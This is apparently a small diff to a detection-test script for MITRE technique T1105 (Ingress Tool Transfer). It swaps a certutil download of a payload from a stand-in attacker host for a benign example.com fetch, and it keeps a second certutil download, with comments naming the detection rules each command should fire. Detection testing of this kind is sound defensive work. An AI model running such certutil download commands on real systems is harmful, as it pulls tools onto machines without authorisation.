@@ -2,7 +2,7 @@
 # Technique: T1105 (Ingress Tool Transfer)
 
 # 1) Download to current directory (fires 996001 + 996002)
-certutil.exe -urlcache -f http://attacker.local/payload.bin payload.bin
+certutil.exe -urlcache -f http://example.com/fakefile.txt -noDownload
 
 # 2) Download via HTTPS (fires 996001 + 996002)
 certutil.exe -urlcache -f https://example.com/test.bin test.bin
